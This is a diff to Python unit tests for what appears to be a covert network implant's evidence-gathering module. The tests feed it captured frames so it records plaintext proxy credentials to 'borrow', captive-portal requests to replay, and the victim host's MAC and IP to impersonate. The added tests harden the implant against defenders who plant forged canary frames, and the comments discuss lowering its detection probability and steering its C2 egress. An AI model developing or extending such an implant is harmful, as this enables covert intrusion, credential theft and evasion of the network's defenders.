@@ -61,6 +61,20 @@ class EvidenceCase(unittest.TestCase):
         head = ("\r\n".join(lines) + "\r\n\r\n").encode()
         return _tcp(self.GATEWAY, self.HOST, sport, 44444, head + body)
 
+    def refused_proxy(self, evidence=None, dport=3128):
+        """Play the CONNECT and the 407 a borrowable credential needs.
+
+        A `Proxy-Authorization` header on its own is one frame anybody on
+        the tapped segment can send, and the borrow rung answers a
+        *refusal* -- so the refusal is the precondition, and every test
+        about a credential plays it.
+        """
+        target = self.evidence if evidence is None else evidence
+        target.observe(self.http_request("CONNECT", "proxy.lan:%d" % dport,
+                                         "a:443", dport=dport))
+        target.observe(self.http_response(
+            407, ['Proxy-Authenticate: Basic realm="corp"'], sport=dport))
+
     def dns_query(self, name, resolver):
         return (Ether() / IP(src=self.HOST, dst=resolver)
                 / UDP(sport=55555, dport=53)
@@ -254,6 +268,7 @@ class TestTheCredentialsTheHostHandsOver(EvidenceCase):
     """Plaintext credentials on the wire, for the borrow rung."""
 
     def test_a_basic_proxy_authorization_header_is_recorded_decoded(self):
+        self.refused_proxy()
         self.evidence.observe(self.http_request(
             "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128,
             headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
@@ -268,6 +283,7 @@ class TestTheCredentialsTheHostHandsOver(EvidenceCase):
         # NTLM is a challenge-response, so the header carries no password
         # to borrow. Recorded as what it is, so the rung can decline with a
         # reason rather than select a credential with an empty secret.
+        self.refused_proxy()
         self.evidence.observe(self.http_request(
             "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128,
             headers=["Proxy-Authorization: NTLM TlRMTVNTUAAB"]))
@@ -276,6 +292,7 @@ class TestTheCredentialsTheHostHandsOver(EvidenceCase):
         self.assertEqual(self.evidence.credentials[0]["secret"], "")
 
     def test_the_same_credential_twice_is_recorded_once(self):
+        self.refused_proxy()
         for _ in range(2):
             self.evidence.observe(self.http_request(
                 "CONNECT", "proxy.lan:3128", "intranet.lan:443", dport=3128,
@@ -287,19 +304,188 @@ class TestTheCredentialsTheHostHandsOver(EvidenceCase):
                       "Basic bm9jb2xvbg=="):
             with self.subTest(value=value):
                 fresh = evidence_mod.Evidence()
+                self.refused_proxy(fresh)
                 fresh.observe(self.http_request(
                     "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
                     headers=["Proxy-Authorization: " + value]))
                 self.assertEqual(fresh.credentials, [])
 
 
+class TestTheEvidenceIsAdversaryWritable(EvidenceCase):
+    """Anybody on the tapped segment can write to this wire.
+
+    A review found the sharp end of it: the borrow rung makes the proxy a
+    frame named the implant's own proxy, and replays the request a frame
+    said the host got past. Three forged frames therefore pointed the
+    implant's C2 at an attacker's host, or made it POST an attacker's body
+    to an attacker's URL -- and the same frames set `portal_answered`,
+    which lowers the borrow rung's detection probability and moves its
+    crossing to hour zero. The evidence that moves the gate was forgeable
+    in the loud direction.
+
+    The design never considered this: it treats "what the host proves
+    works" as ground truth throughout. It is not ground truth; it is
+    unauthenticated frames. What follows is the narrowing, and each test
+    is a frame sequence a defender who suspected a tap could plant.
+    """
+
+    def test_a_credential_needs_a_proxy_the_host_really_used(self):
+        # `Proxy-Authorization` on an ordinary request to an arbitrary
+        # host is one frame. Recorded only against a `CONNECT` whose
+        # destination the host actually proxied through.
+        self.evidence.observe(self.http_request(
+            "GET", "intranet.lan", "/",
+            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
+        self.assertEqual(self.evidence.credentials, [])
+
+    def test_a_credential_needs_the_proxy_to_have_demanded_one(self):
+        # A CONNECT with a credential and no 407 in front of it is a frame
+        # anybody can send. The rung answers a *refusal*, so the refusal
+        # has to have happened.
+        self.evidence.observe(self.http_request(
+            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
+            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
+        self.assertEqual(self.evidence.credentials, [])
+
+    def test_a_credential_answering_a_real_407_is_recorded(self):
+        self.evidence.observe(self.http_request(
+            "CONNECT", "proxy.lan:3128", "a:443", dport=3128))
+        self.evidence.observe(self.http_response(
+            407, ["Proxy-Authenticate: Basic realm=\"corp\""], sport=3128))
+        self.evidence.observe(self.http_request(
+            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
+            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
+        self.assertEqual([c["user"] for c in self.evidence.credentials],
+                         ["corp\\alice"])
+
+    def test_a_407_from_somewhere_else_does_not_open_the_door(self):
+        self.evidence.observe(self.http_request(
+            "CONNECT", "proxy.lan:3128", "a:443", dport=3128))
+        self.evidence.observe(self.http_response(407, sport=8080))
+        self.evidence.observe(self.http_request(
+            "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
+            headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
+        self.assertEqual(self.evidence.credentials, [])
+
+    def test_a_portal_at_a_public_address_is_not_recorded(self):
+        # A captive portal is on the network the host is being held off,
+        # so a redirect to a public *address* is not one: it is a frame
+        # pointing the implant at somebody's canary URL.
+        for host in ("8.8.8.8", "203.0.113.9", "172.32.0.1", "11.0.0.1"):
+            with self.subTest(host=host):
+                fresh = evidence_mod.Evidence()
+                fresh.observe(self.http_response(
+                    302, ["Location: http://%s/burn?id=implant" % host]))
+                fresh.observe(self.http_request(
+                    "POST", host, "/burn?id=implant", body=b"a=1"))
+                fresh.observe(self.http_response(200))
+                self.assertFalse(fresh.portal_answered)
+                self.assertIsNone(fresh.portal)
+
+    def test_a_portal_named_rather_than_addressed_is_still_recorded(self):
+        # And this is a **residual risk**, written down here and in the
+        # design's risk table rather than papered over. A real portal
+        # usually has a name, this implant cannot resolve one to check
+        # where it points, and refusing every name would lose the rung in
+        # the enterprise case it exists for. So a forger who names their
+        # canary gets a replay. What it costs them is the rest of the
+        # sequence: a 302 to that name, a POST on one flow, and a 2xx on
+        # the same flow, all on a port the scout is watching.
+        fresh = evidence_mod.Evidence()
+        fresh.observe(self.http_response(
+            302, ["Location: http://canary.attacker.test/burn"]))
+        fresh.observe(self.http_request("POST", "canary.attacker.test",
+                                        "/burn", body=b"a=1"))
+        fresh.observe(self.http_response(200))
+        self.assertTrue(fresh.portal_answered)
+
+    def test_a_portal_on_the_local_network_is_recorded(self):
+        for host in ("10.0.0.1", "192.168.9.1", "172.16.4.1",
+                     "169.254.1.1", "portal.lan"):
+            with self.subTest(host=host):
+                fresh = evidence_mod.Evidence()
+                fresh.observe(self.http_response(
+                    302, ["Location: http://%s/login" % host]))
+                fresh.observe(self.http_request("POST", host, "/login",
+                                                body=b"accept=1"))
+                fresh.observe(self.http_response(200))
+                self.assertTrue(fresh.portal_answered, host)
+
+    def test_a_portal_body_is_capped(self):
+        # A frame can carry 64 KB of form body, and the rung replays it.
+        self.evidence.observe(self.http_response(
+            302, ["Location: http://portal.lan/login"]))
+        self.evidence.observe(self.http_request(
+            "POST", "portal.lan", "/login", body=b"x" * 20000))
+        self.evidence.observe(self.http_response(200))
+        self.assertIsNone(self.evidence.portal,
+                          "a body this size is not a portal form")
+
+    def test_the_lists_are_bounded(self):
+        # Every container here grows for as long as the implant is dark,
+        # which the design's own worst case puts at a week, on a 4 GB
+        # device that is bridging at the same time. A review measured
+        # 400 MB from 40,000 frames.
+        for index in range(evidence_mod.MAX_ENTRIES * 3):
+            # More than MAX_ENTRIES *distinct* resolvers, or the cap is
+            # never reached and the assertion holds for the wrong reason.
+            resolver = "10.%d.%d.%d" % (index // 250, index % 250,
+                                        1 + index % 250)
+            self.evidence.observe(self.client_hello("h%d.example.com" % index))
+            self.evidence.observe(self.server_hello())
+            self.evidence.observe(self.dns_query("q%d.lan" % index, resolver))
+            self.evidence.observe(self.dns_answer("q%d.lan" % index,
+                                                  resolver))
+        self.assertLessEqual(len(self.evidence.tls_destinations),
+                             evidence_mod.MAX_ENTRIES)
+        self.assertLessEqual(len(self.evidence.resolvers),
+                             evidence_mod.MAX_ENTRIES)
+
+    def test_what_waits_for_an_answer_is_bounded_too(self):
+        # The sharper half: an unanswered query and an unanswered
+        # ClientHello are retained while they wait, and on a busy segment
+        # most of them are never answered.
+        for index in range(evidence_mod.MAX_PENDING * 3):
+            self.evidence.observe(self.dns_query("q%d.lan" % index,
+                                                 "10.0.0.2"))
+            self.evidence.observe(_tcp(self.HOST, self.GATEWAY,
+                                       40000 + (index % 20000), 443,
+                                       _client_hello_bytes(
+                                           "h%d.example.com" % index)))
+        self.assertLessEqual(len(self.evidence._dns_pending),
+                             evidence_mod.MAX_PENDING)
+        self.assertLessEqual(len(self.evidence._tls_pending),
+                             evidence_mod.MAX_PENDING)
+
+
 class TestTheHostsIdentity(EvidenceCase):
-    """The MAC and IP rung 4 would take."""
+    """The MAC and IP rung 4 would take -- the host's, not the implant's."""
 
     def test_the_first_host_side_sender_is_the_identity(self):
         self.evidence.observe(self.http_request("GET", "intranet.lan", "/"))
         self.assertEqual(self.evidence.host_mac, "aa:bb:cc:dd:ee:ff")
         self.assertEqual(self.evidence.host_ip, self.HOST)
+
+    def test_the_implants_own_traffic_is_not_the_host(self):
+        # The scout sniffs `br0`, which carries the beacon's own queries
+        # and its own TLS -- so without this the document and the model's
+        # prompt could describe the implant to itself, and the trail would
+        # name the implant as the identity rung 4 would take.
+        mine = evidence_mod.Evidence(own_mac="AA:BB:CC:DD:EE:FF")
+        mine.observe(self.http_request("GET", "intranet.lan", "/"))
+        self.assertIsNone(mine.host_mac)
+        self.assertIsNone(mine.host_ip)
+
+        mine.observe(_tcp(self.HOST, self.GATEWAY, 1, 80,
+                          b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
+                     .__class__(bytes(
+                         Ether(src="de:ad:be:ef:00:01",
+                               dst="11:22:33:44:55:66")
+                         / IP(src="10.0.0.77", dst=self.GATEWAY)
+                         / TCP(sport=2, dport=80)
+                         / Raw(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n"))))
+        self.assertEqual(mine.host_mac, "de:ad:be:ef:00:01")
+        self.assertEqual(mine.host_ip, "10.0.0.77")
 
 
 class TestNothingObserveIsGivenMayRaise(EvidenceCase):
@@ -336,6 +522,7 @@ class TestTheDocumentFields(EvidenceCase):
     def test_the_fields_are_json_safe_and_carry_no_secret(self):
         import json
         self.evidence.observe(self.eapol())
+        self.refused_proxy()
         self.evidence.observe(self.http_request(
             "CONNECT", "proxy.lan:3128", "a:443", dport=3128,
             headers=["Proxy-Authorization: Basic Y29ycFxhbGljZTpzM2NyZXQ="]))
